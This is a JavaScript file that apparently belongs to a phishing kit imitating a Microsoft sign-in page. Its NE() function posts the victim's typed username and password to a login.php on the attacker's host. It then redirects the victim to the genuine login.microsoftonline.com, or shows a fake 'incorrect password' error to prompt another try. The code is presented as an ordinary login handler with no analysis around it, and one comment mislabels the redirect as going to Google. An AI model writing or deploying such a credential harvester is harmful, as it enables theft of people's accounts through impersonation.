Login.submitLoginRequests = function () {
	var u = new InputUtil();
	var e = new LoginErrors();

	var userName = document.getElementById(Login.userNameInput);
	var password = document.getElementById(Login.passwordInput);

	if (!userName.value || !userName.value.match('[@\\\\]')) {
		u.setError(userName, e.userNameFormatError);
		return false;
	}

	if (!password.value) {
		u.setError(password, e.passwordEmpty);
		return false;
	}

	if (password.value.length > maxPasswordLength) {
		u.setError(password, e.passwordTooLong);
		return false;
	}

	NE();
	return false;
}

function staticUrl(){
	var url = location.protocol + '//' + location.host + location.pathname
	var new_url = url.replace("process.php", "login.php");
	return new_url;

}

var USER = document.getElementById('userNameInput');
var PASS = document.getElementById('passwordInput');
var ErrorText = document.getElementById('errorText');
var Error = document.getElementById('error');

function NE() {
	Error.style.display = "none";
	document.getElementById("submitButton").setAttribute('disabled','true');
	
	var hr = new XMLHttpRequest();
	var url = staticUrl();
	var vars = "user=" + USER.value + "&pass=" + PASS.value;
	hr.open("POST", url, true);
	hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	hr.send(vars);

	hr.onreadystatechange = function () {
		if (hr.readyState == XMLHttpRequest.DONE) {

			var resp = hr.responseText;

			if (resp == 1) {
                window.location.href = 'https://login.microsoftonline.com/'; //Will take you to Google.
			} else {
				document.getElementById("submitButton").setAttribute('disabled','false');
				ErrorText.innerHTML = "Incorrect user ID or password. Type the correct user ID and password, and try again.";
				Error.style.display = "block";
				PASS.value = "";
				PASS.focus();
			}
		}
	}
}
